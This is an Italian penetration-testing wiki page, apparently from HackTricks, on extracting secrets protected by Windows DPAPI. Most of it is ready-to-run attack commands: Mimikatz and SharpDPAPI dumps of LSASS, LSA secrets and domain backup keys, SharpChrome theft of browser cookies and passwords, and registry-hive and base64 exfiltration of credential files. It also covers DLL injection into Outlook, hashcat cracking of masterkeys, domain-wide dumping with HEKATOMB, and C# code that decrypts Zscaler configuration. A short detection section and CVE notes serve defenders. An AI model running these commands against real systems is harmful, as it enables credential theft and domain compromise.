# DPAPI - Estrazione delle password

{{#include ../../banners/hacktricks-training.md}}



## Cos'è DPAPI

La Data Protection API (DPAPI) viene utilizzata principalmente nel sistema operativo Windows per la **crittografia simmetrica delle chiavi private asimmetriche**, sfruttando i segreti dell'utente o del sistema come importante fonte di entropia. Questo approccio semplifica la crittografia per gli sviluppatori, consentendo loro di crittografare i dati usando una chiave derivata dai segreti di accesso dell'utente oppure, nel caso della crittografia di sistema, dai segreti di autenticazione del dominio del sistema. In questo modo gli sviluppatori non devono gestire personalmente la protezione della chiave di crittografia.

Il modo più comune per usare DPAPI è tramite le funzioni **`CryptProtectData` e `CryptUnprotectData`**, che consentono alle applicazioni di crittografare e decrittografare i dati usando il contesto di sicurezza del processo attualmente connesso. Per impostazione predefinita, i dati possono essere decrittografati solo dallo stesso utente o dallo stesso contesto di sistema che li ha crittografati.<sup>[[2]](#references)[[3]](#references)</sup>

Queste funzioni accettano anche un **parametro di entropia** facoltativo, usato durante la crittografia e la decrittografia. Per decrittografare i dati protetti con entropia facoltativa è necessario usare lo stesso valore di entropia.<sup>[[2]](#references)[[6]](#references)</sup>

### Generazione della chiave dell'utente

DPAPI deriva un valore specifico dell'utente (spesso chiamato **pre-key**) dalle credenziali dell'utente. Il metodo esatto di derivazione dipende dall'account e dalla versione del sistema operativo. Per esempio, Impacket prova un percorso HMAC-SHA1 basato sul digest SHA-1 della password UTF-16LE, un altro basato sull'hash MD4/NT della password e un percorso derivato con PBKDF2-SHA256 per gli utenti protetti. Per questo motivo, spesso gli strumenti offline possono derivare il materiale necessario sia dalla password in chiaro sia da un hash NT disponibile.<sup>[[2]](#references)[[10]](#references)</sup>

Questo è particolarmente interessante perché, se un attacker riesce a ottenere l'hash della password dell'utente, può:

- **Decrittografare qualsiasi dato crittografato con DPAPI** usando la chiave dell'utente, senza dover contattare alcuna API
- Provare a **crackare la password** offline, tentando di generare la chiave DPAPI corretta

DPAPI mantiene una o più **master key** per ogni utente, invece di crearne una nuova per ogni blob protetto. Ogni master key ha un **GUID** (Globally Unique Identifier) e un blob crittografato indica quale master key lo protegge.<sup>[[2]](#references)</sup>

Le master key sono archiviate nella directory **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, dove `{SID}` è l'identificatore di sicurezza (Security Identifier) dell'utente. Il file della master key contiene materiale protetto dalla **pre-key** dell'utente e, per gli utenti di dominio, materiale di ripristino protetto da una **domain backup key**.<sup>[[2]](#references)</sup>

Si noti che la **chiave di dominio usata per crittografare la master key si trova sui domain controller e non cambia mai**. Pertanto, se un attacker ha accesso al domain controller, può recuperare la domain backup key e decrittografare le master key di tutti gli utenti del dominio.<sup>[[2]](#references)</sup>

Gli header dei blob crittografati contengono il **GUID della master key** usata per crittografare i dati al loro interno.

> [!TIP]
> I blob crittografati con DPAPI iniziano con **`01 00 00 00`**

Trova le master key:

```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```

Questo è l'aspetto di un gruppo di Master Keys di un utente:

![Cos'è DPAPI - Generazione delle chiavi utente: questo è l'aspetto di un gruppo di Master Keys di un utente](<../../images/image (1121).png>)

### Generazione delle chiavi Machine/System

Questa chiave viene usata dalla macchina per crittografare i dati. Si basa sul **segreto LSA DPAPI_SYSTEM**, una chiave speciale a cui può accedere solo l'utente SYSTEM. Viene usata per crittografare i dati che devono essere accessibili al sistema stesso, come le credenziali a livello di macchina o i segreti a livello di sistema.<sup>[[2]](#references)</sup>

Nota che queste chiavi **non hanno un backup del dominio**, quindi sono accessibili solo localmente:

- **Mimikatz** può accedervi eseguendo il dump dei segreti LSA con il comando: `mimikatz lsadump::secrets`
- Il segreto è archiviato nel registro, quindi un amministratore potrebbe **modificare le autorizzazioni DACL per accedervi**. Il percorso del registro è: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- È possibile anche estrarre i dati offline dagli hive del registro. Ad esempio, come amministratore sul target, salva gli hive ed esfiltrali:

```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```

Quindi, sulla tua macchina di analisi, recupera il secret DPAPI_SYSTEM LSA dagli hive e usalo per decrittare i blob DPAPI protetti a livello macchina (ad esempio, credenziali di applicazioni o profili Wi-Fi protetti dalla macchina):

```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```

Esempio specifico di Veeam DPAPI:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### Dati protetti da DPAPI

Tra i dati personali protetti da DPAPI ci sono:

- Credenziali Windows
- Password e dati di completamento automatico di Internet Explorer e Google Chrome
- Password degli account e-mail e FTP interni per applicazioni come Outlook e Windows Mail
- Password per cartelle condivise, risorse, reti wireless e Windows Vault, incluse le chiavi di crittografia
- Password per connessioni Remote Desktop, .NET Passport e chiavi private per vari scopi di crittografia e autenticazione
- Password di rete gestite da Credential Manager e dati personali nelle applicazioni che usano CryptProtectData, come Skype, MSN Messenger e altre
- Blob crittografati nel registro di sistema
- ...

I dati protetti dal sistema includono:
- Password Wi-Fi
- ...

Le password delle attività pianificate sono una questione distinta, legata ai segreti LSA. Un'attività registrata con il [tipo di accesso Password](https://learn.microsoft.com/en-us/windows/win32/api/taskschd/ne-taskschd-task_logon_type) può memorizzare una password per il ripristino di un account amministratore locale/SYSTEM; un'attività S4U o con token interattivo non dimostra che sia stata salvata una password. Il principal e il tipo di accesso dell'attività sono indicatori più affidabili del solo nome dell'account usato per eseguirla.

### Opzioni di estrazione della master key

- Se l'utente dispone di privilegi di domain admin, può accedere alla **chiave di backup del dominio** per decrittare tutte le master key degli utenti del dominio:

```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```

- Con privilegi di amministratore locale, è possibile **accedere alla memoria di LSASS** per estrarre le chiavi master DPAPI di tutti gli utenti connessi e la chiave SYSTEM.

```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```

- Se l'utente dispone di privilegi di amministratore locale, può accedere al **DPAPI_SYSTEM LSA secret** per decrittare le chiavi master del computer:

```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```

- Se si conosce la password o l'hash NTLM dell'utente, è possibile **decrittare direttamente le master key dell'utente**:

```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```

- Se ti trovi all'interno di una sessione come utente, puoi chiedere al DC la **chiave di backup per decrittare le master key tramite RPC**. Se sei un amministratore locale e l'utente ha effettuato l'accesso, puoi **rubargli il token di sessione**:

```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```


## Elencare i vault

```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```

## Accedere ai dati crittografati con DPAPI

### Trovare i dati crittografati con DPAPI

I file comunemente protetti degli utenti si trovano in:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Controlla anche sostituendo `\Roaming\` con `\Local\` nei percorsi sopra.

Esempi di enumerazione:

```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) può individuare blob crittografati con DPAPI nel file system, nel registro e nei blob B64:<sup>[[12]](#references)</sup>

```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```

Nota che [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (dallo stesso repo) può essere usato per decrittare con DPAPI dati sensibili come i cookie.<sup>[[12]](#references)</sup>

#### Ricette rapide per Chromium/Edge/Electron (SharpChrome)

- Utente corrente, decrittazione interattiva di credenziali/cookie salvati (funziona anche con i cookie app-bound di Chrome 127+ perché la chiave aggiuntiva viene recuperata dal Credential Manager dell'utente quando si esegue nel contesto dell'utente):

```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```

- Analisi offline quando si hanno solo i file. Per prima cosa, estrai la chiave di stato AES dal file "Local State" del profilo, quindi usala per decrittare il database dei cookie:

```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```

- Triage remoto/a livello di dominio quando si dispone della chiave di backup DPAPI del dominio (PVK) e si ha accesso admin all'host target:

```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```

- Se hai la prekey/credkey DPAPI di un utente (ottenuta da LSASS), puoi saltare il password cracking e decrittare direttamente i dati del profilo:

```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```

Note
- Le build più recenti di Chrome/Edge potrebbero archiviare determinati cookie con la crittografia "App-Bound". Non è possibile decrittare offline questi cookie specifici senza la chiave app-bound aggiuntiva; esegui SharpChrome nel contesto dell'utente target per recuperarla automaticamente. Consulta il post del blog sulla sicurezza di Chrome citato di seguito.<sup>[[5]](#references)</sup>

### Chiavi di accesso e dati

- **Usa SharpDPAPI** per ottenere credenziali dai file crittografati con DPAPI della sessione corrente:

```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage 
```

- **Ottenere informazioni sulle credenziali** come i dati crittografati e il guidMasterKey.<sup>[[3]](#references)</sup>

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```

- **Accedere alle masterkey**:

Decifrare una masterkey di un utente richiedendo la **domain backup key** tramite RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```

Lo strumento **SharpDPAPI** supporta anche questi argomenti per la decrittazione delle masterkey (nota che è possibile usare `/rpc` per ottenere la chiave di backup del dominio, `/password` per usare una password in testo semplice oppure `/pvk` per specificare un file con la chiave privata DPAPI del dominio...):<sup>[[12]](#references)</sup>

```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```

- **Decrittare i dati usando una masterkey**:

```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```

Lo strumento **SharpDPAPI** supporta anche questi argomenti per la decrittazione di `credentials|vaults|rdg|keepass|triage|blob|ps` (nota che è possibile usare `/rpc` per ottenere la domain backup key, `/password` per usare una password in testo semplice, `/pvk` per specificare un file con la chiave privata DPAPI del dominio, `/unprotect` per usare la sessione dell'utente corrente...):<sup>[[12]](#references)</sup>

```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
                        Note: must use with /pvk:KEY or /password:X
                        Note: not applicable to 'blob' or 'ps' commands
```

- Uso diretto di una prekey/credkey DPAPI (senza password)

Se riesci a eseguire il dump di LSASS, Mimikatz spesso espone una chiave DPAPI per ogni sessione di accesso, che può essere usata per decrittare le masterkey dell’utente senza conoscere la password in chiaro. Passa questo valore direttamente allo strumento:

```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```


- Decrittare alcuni dati utilizzando la **sessione dell'utente corrente**:

```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```

---

### Decrittazione offline con Impacket dpapi.py

Se hai il SID e la password dell'utente vittima (o l'hash NT), puoi decrittare completamente offline le masterkey DPAPI e i blob di Credential Manager usando Impacket dpapi.py.<sup>[[10]](#references)[[11]](#references)</sup>

- Identifica gli artefatti su disco:
  - Blob di Credential Manager: %APPDATA%\Microsoft\Credentials\<hex>
  - Masterkey corrispondente: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Se gli strumenti per il trasferimento dei file non sono affidabili, codifica i file in base64 sull'host e copia l'output:

```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```

- Decrittografa la masterkey con il SID e la password/hash dell’utente:

```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```

- Usa la masterkey decrittata per decrittare il credential blob:

```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```

Questo workflow spesso recupera credenziali di dominio salvate dalle app tramite Windows Credential Manager, inclusi account amministrativi (ad es. `*_adm`).

---

### Gestione dell'entropia opzionale ("Third-party entropy")

Alcune applicazioni passano un valore di **entropy** aggiuntivo a `CryptProtectData`. Senza questo valore, il blob non può essere decrittato, anche se si conosce la masterkey corretta. Ottenere l'entropia è quindi essenziale quando si prendono di mira credenziali protette in questo modo (ad es. Microsoft Outlook, alcuni client VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) è una DLL in user-mode che esegue hooking delle funzioni DPAPI all'interno del processo target e registra in modo trasparente qualsiasi entropia opzionale fornita. Eseguendo EntropyCapture in modalità **DLL-injection** su processi come `outlook.exe` o `vpnclient.exe`, verrà generato un file che associa ogni buffer di entropia al processo chiamante e al blob. L'entropia acquisita può essere successivamente fornita a **SharpDPAPI** (`/entropy:`) o **Mimikatz** (`/entropy:<file>`) per decrittare i dati.<sup>[[6]](#references)</sup>

```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```


### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft ha introdotto un formato di masterkey **context 3** a partire da Windows 10 v1607 (2016). `hashcat` v6.2.6 (dicembre 2023) ha aggiunto gli hash-mode **22100** (DPAPI masterkey v1 context ), **22101** (context 1) e **22102** (context 3), consentendo il cracking accelerato da GPU delle password degli utenti direttamente dal file masterkey. Gli attacker possono quindi eseguire attacchi word-list o brute-force senza interagire con il sistema target.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) automatizza il processo:

```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```

Lo strumento può anche analizzare i blob Credential e Vault, decrittarli con chiavi crackate ed esportare le password in chiaro.<sup>[[8]](#references)</sup>


### Accedere ai dati di un'altra macchina

In **SharpDPAPI e SharpChrome** puoi indicare l'opzione **`/server:HOST`** per accedere ai dati di una macchina remota. Naturalmente devi poter accedere a quella macchina e, nel seguente esempio, si presume che la **chiave di crittografia di backup del dominio sia nota**:

```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```

## Altri strumenti

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) è uno strumento che automatizza l’estrazione di tutti gli utenti e i computer dalla directory LDAP e l’estrazione della domain controller backup key tramite RPC. Lo script risolve quindi gli indirizzi IP di tutti i computer ed esegue smbclient su ciascuno per recuperare tutti i DPAPI blob degli utenti e decrittarli con la domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Con l’elenco dei computer estratto da LDAP puoi individuare tutte le subnet, anche se non le conoscevi!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) può eseguire automaticamente il dump dei secrets protetti da DPAPI. La release 2.x ha introdotto:<sup>[[9]](#references)</sup>

* Raccolta parallela di blob da centinaia di host
* Parsing delle masterkey di **context 3** e integrazione automatica con Hashcat per il cracking
* Supporto per i cookie cifrati “App-Bound” di Chrome (vedi la sezione successiva)
* Una nuova modalità **`--snapshot`** per interrogare ripetutamente gli endpoint e rilevare le differenze nei blob creati di recente

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) è un parser C# per file masterkey/credential/vault che può generare formati Hashcat/JtR e, facoltativamente, avviare automaticamente il cracking. Supporta pienamente i formati delle masterkey di macchina e utente fino a Windows 11 24H1.<sup>[[8]](#references)</sup>


## Rilevamenti comuni

- Accesso ai file in `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` e in altre directory correlate a DPAPI.
    - Soprattutto da una condivisione di rete come **C$** o **ADMIN$**.
- Uso di **Mimikatz**, **SharpDPAPI** o strumenti simili per accedere alla memoria di LSASS o eseguire il dump delle masterkey.
- Evento **4662**: *È stata eseguita un’operazione su un oggetto* – può essere correlato all’accesso all’oggetto **`BCKUPKEY`**.
- Evento **4673/4674** quando un processo richiede *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Vulnerabilità e cambiamenti dell’ecosistema 2023-2025

* **CVE-2023-36004 – Spoofing del Secure Channel di Windows DPAPI** (novembre 2023). Un attaccante con accesso alla rete poteva indurre un membro del dominio a recuperare una DPAPI backup key malevola, consentendo la decrittazione delle masterkey degli utenti. La vulnerabilità è stata corretta nell’aggiornamento cumulativo di novembre 2023: gli amministratori dovrebbero assicurarsi che DC e workstation siano completamente aggiornati.<sup>[[4]](#references)</sup>
* **Cifratura dei cookie “App-Bound” di Chrome 127** (luglio 2024): ha sostituito la protezione legacy basata solo su DPAPI con una chiave aggiuntiva archiviata nel **Credential Manager** dell’utente. Per decrittare i cookie offline sono ora necessarie sia la masterkey DPAPI sia la **chiave app-bound avvolta con GCM**. SharpChrome v2.3 e DonPAPI 2.x possono recuperare la chiave aggiuntiva se eseguiti nel contesto dell’utente.<sup>[[5]](#references)</sup>


### Caso di studio: Zscaler Client Connector – Entropia personalizzata derivata dal SID

Zscaler Client Connector archivia diversi file di configurazione in `C:\ProgramData\Zscaler` (ad es. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Ogni file è cifrato con **DPAPI (Machine scope)**, ma il vendor fornisce **entropia personalizzata**, *calcolata in fase di esecuzione* invece di essere archiviata su disco.<sup>[[1]](#references)</sup>

L’entropia viene ricostruita a partire da due elementi:

1. Un secret hard-coded incorporato in `ZSACredentialProvider.dll`.
2. Il **SID** dell’account Windows a cui appartiene la configurazione.

L’algoritmo implementato dalla DLL equivale a:

```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
    tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
    entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```

Poiché il segreto è incorporato in una DLL leggibile dal disco, **qualsiasi attaccante locale con privilegi SYSTEM può rigenerare l'entropia per qualsiasi SID** e decrittografare i blob offline:

```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```

La decrittazione restituisce la configurazione JSON completa, inclusi tutti i **controlli di postura del dispositivo** e i relativi valori attesi: informazioni molto preziose per tentare bypass lato client.

> SUGGERIMENTO: gli altri artefatti cifrati (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) sono protetti con DPAPI **senza** entropy (16 byte a zero). Una volta ottenuti i privilegi SYSTEM, possono quindi essere decrittati direttamente con `ProtectedData.Unprotect`.

## References

- [1] [Synacktiv – Dovresti fidarti del tuo zero trust? Bypass dei controlli di postura di Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [Segreti DPAPI. Analisi della sicurezza e recupero dei dati in DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Lettura dei segreti cifrati con DPAPI con Mimikatz e C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Vulnerabilità di spoofing di Windows DPAPI (Data Protection Application Programming Interface)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Migliorare la sicurezza dei cookie di Chrome su Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: semplice estrazione dell'entropy opzionale di DPAPI](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [Note di rilascio di hashcat v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – repository GitHub](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – pagina del progetto PyPI](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: abuso di AD ACL, cracking di Argon2 in KeePassXC e decrittazione DPAPI fino a ottenere i privilegi di amministratore del DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – utilizzo e opzioni](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
